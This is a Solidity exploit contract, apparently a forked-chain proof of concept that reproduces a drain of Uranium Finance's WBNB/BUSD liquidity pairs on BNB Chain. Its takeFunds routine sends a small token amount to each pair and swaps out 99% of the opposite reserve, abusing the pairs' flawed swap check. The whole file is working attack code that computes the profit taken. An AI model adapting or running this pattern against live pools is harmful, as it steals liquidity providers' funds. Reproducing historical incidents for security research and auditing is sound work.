// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
}

interface IWrappedNative {
    function deposit() external payable;
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address);
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract Exploit {
    function run() external payable returns (uint256) {
        CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        cheat.createSelectFork("bsc", 6920000);

        address wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        address busd = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        address uraniumFactory = 0xA943eA143cd7E79806d670f4a7cf08F8922a454F;

        uint256 initBalance = IERC20(wbnb).balanceOf(address(this)) + IERC20(busd).balanceOf(address(this));

        IWrappedNative(wbnb).deposit{value: 1 ether}();

        takeFunds(wbnb, busd, 1 ether, uraniumFactory);
        takeFunds(busd, wbnb, 1 ether, uraniumFactory);

        uint256 finalBalance = IERC20(wbnb).balanceOf(address(this)) + IERC20(busd).balanceOf(address(this));
        return finalBalance > initBalance ? finalBalance - initBalance : 0;
    }

    function takeFunds(address token0, address token1, uint256 amount, address factoryAddress) internal {
        IUniswapV2Factory factory = IUniswapV2Factory(factoryAddress);
        address pairAddr = factory.getPair(token1, token0);
        IUniswapV2Pair pair = IUniswapV2Pair(pairAddr);
        IERC20(token0).transfer(pairAddr, amount);
        uint256 amountOut = (IERC20(token1).balanceOf(pairAddr) * 99) / 100;
        if (pair.token0() == token1) {
            pair.swap(amountOut, 0, address(this), new bytes(0));
        } else {
            pair.swap(0, amountOut, address(this), new bytes(0));
        }
    }

    receive() external payable {}
}
